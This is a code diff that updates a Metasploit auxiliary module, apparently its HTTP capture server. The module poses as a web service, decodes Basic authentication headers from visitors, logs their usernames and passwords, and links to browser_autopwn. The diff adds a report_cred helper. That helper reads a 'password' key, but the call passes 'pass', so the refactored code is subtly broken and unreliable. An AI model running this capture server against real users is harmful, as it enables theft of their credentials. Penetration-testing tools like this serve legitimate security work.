@@ -1,14 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
@@ -51,7 +46,7 @@ class Metasploit3 < Msf::Auxiliary
         OptAddress.new('AUTOPWN_HOST',[ false, "The IP address of the browser_autopwn service ", nil ]),
         OptPort.new('AUTOPWN_PORT',[ false, "The SRVPORT port of the browser_autopwn service ", nil ]),
         OptString.new('AUTOPWN_URI',[ false, "The URIPATH of the browser_autopwn service ", nil ]),
-      ], self.class)
+      ])
   end
 
   # Not compatible today
@@ -75,7 +70,6 @@ class Metasploit3 < Msf::Auxiliary
       @myautopwn = true
     end
 
-    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
     exploit()
   end
 
@@ -108,6 +102,32 @@ class Metasploit3 < Msf::Auxiliary
     cli.close
     # Require to clean up the service properly
     raise ::EOFError
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   def dispatch_request(cli, req)
@@ -187,14 +207,14 @@ class Metasploit3 < Msf::Auxiliary
     if(req['Authorization'] and req['Authorization'] =~ /basic/i)
       basic,auth = req['Authorization'].split(/\s+/)
       user,pass  = Rex::Text.decode_base64(auth).split(':', 2)
-      report_auth_info(
-        :host      => cli.peerhost,
-        :port      => @myport,
-        :sname     => (ssl ? "https" : "http"),
-        :user      => user,
-        :pass      => pass,
-        :source_type => "captured",
-        :active    => true
+
+      report_cred(
+        ip: cli.peerhost,
+        port: @myport,
+        service_name: (ssl ? "https" : "http"),
+        user: user,
+        pass: pass,
+        proof: req.resource.to_s
       )
 
       report_note(
@@ -203,7 +223,7 @@ class Metasploit3 < Msf::Auxiliary
         :data     => req.resource.to_s,
         :update => :unique_data
       )
-      print_status("HTTP LOGIN #{cli.peerhost} > #{hhead}:#{@myport} #{user} / #{pass} => #{req.resource}")
+      print_good("HTTP LOGIN #{cli.peerhost} > #{hhead}:#{@myport} #{user} / #{pass} => #{req.resource}")
     end
 
 
@@ -467,5 +487,4 @@ class Metasploit3 < Msf::Auxiliary
 |
 
   end
-
 end
